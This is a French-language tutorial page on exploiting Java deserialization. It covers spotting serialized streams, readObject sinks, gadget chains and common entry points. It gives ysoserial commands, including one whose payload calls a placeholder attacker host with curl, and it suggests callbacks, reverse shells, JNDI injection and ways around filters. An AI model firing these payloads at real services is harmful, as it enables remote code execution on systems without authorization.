---
order: 3
title: "Désérialisation Java : chaînes de gadgets readObject avec ysoserial"
description: "Exploiter la désérialisation Java : reconnaître le flux, sinks ObjectInputStream.readObject, assembler des chaînes de gadgets avec ysoserial, et points d'entrée courants comme les paramètres HTTP, RMI et JMX."
keywords:
  - désérialisation java
  - readObject
  - ysoserial
  - chaîne de gadgets
  - ObjectInputStream
---

# Désérialisation Java

La désérialisation Java retransforme un flux d'octets en objets via `ObjectInputStream.readObject()`. Pendant la reconstruction, la JVM exécute `readObject`, `readResolve` et des callbacks apparentés sur les objets reconstruits, et certaines classes de bibliothèque effectuent un travail dangereux (réflexion, invocation de méthode, compilation de template) à l'intérieur de ces callbacks. Les chaîner atteint l'**exécution de code à distance**, et la chaîne est construite à partir de classes de gadgets déjà présentes sur le classpath de l'application.

## Reconnaître le flux

Le Java sérialisé commence par les octets magiques `AC ED 00 05`. Encodé en base64, cela donne un `rO0` en tête ; gzip-puis-base64 est courant aussi (`H4sI`). Cherchez dans les cookies, les champs de formulaire cachés, les jetons de type `viewstate`, les en-têtes personnalisés, le trafic RMI/JMX/JNDI, et tout endpoint prenant un blob base64.

## Le sink et les gadgets

Le sink est tout `readObject()` (ou wrapper de framework) alimenté par des octets non fiables. L'attaquant ne peut pas ajouter de classes au serveur, donc l'exploitation dépend de **ce qui est déjà sur le classpath** : Commons-Collections, Commons-BeanUtils, Spring, Groovy, Hibernate, Rome et d'autres fournissent des classes dont les callbacks de désérialisation peuvent être chaînés en de la réflexion qui appelle `Runtime.exec`. Assemblez-les avec **ysoserial** :

```bash
# Pick the payload matching a library on the target's classpath
java -jar ysoserial.jar CommonsCollections6 'id' > payload.bin
java -jar ysoserial.jar CommonsBeanutils1 'curl http://attacker/x' | base64
java -jar ysoserial.jar Groovy1 'id'
```

Livrez `payload.bin` au sink dans la forme qu'il attend (octets bruts, base64, gzip+base64). Lorsque la sortie n'est pas renvoyée, utilisez une commande qui rappelle (DNS, HTTP) ou un reverse shell ; testez en aveugle d'abord avec un collaborator/une interaction OOB.

## Points d'entrée courants

- **HTTP** : blobs base64 dans des cookies, paramètres ou en-têtes passés à `readObject`.
- **RMI / JMX / JMS** : protocoles d'invocation distante qui désérialisent les arguments ; `marshalsec` aide ici.
- **Injection JNDI** : une désérialisation ou une lookup qui résout une URL LDAP/RMI de l'attaquant, récupérant une factory distante (le vecteur de type Log4Shell), utile lorsqu'aucun gadget local ne convient.
- **T3 (WebLogic), et autres protocoles de serveur d'applications** avec leurs propres formats de fil sérialisés.

## Notes d'exploitation

- Faites correspondre le gadget à une *version* de bibliothèque sur le classpath ; `CommonsCollections1` à `7` ciblent différentes versions, donc essayez-en plusieurs.
- Les filtres de sérialisation et allowlists de JEP 290 peuvent bloquer les gadgets connus ; énumérez le classpath pour une chaîne non filtrée, ou basculez vers l'injection JNDI qui n'a pas besoin de gadget local.
- Pour la détection sans chaîne fonctionnelle, un payload `URLDNS` déclenche une lookup DNS à la désérialisation, confirmant le sink en aveugle.

## Outils

- **ysoserial** : le générateur standard de chaînes de gadgets.
- **marshalsec** : RMI/JNDI/JMX et formats alternatifs.

## Références

- PortSwigger Web Security Academy: Insecure deserialization (Java)
- ysoserial project
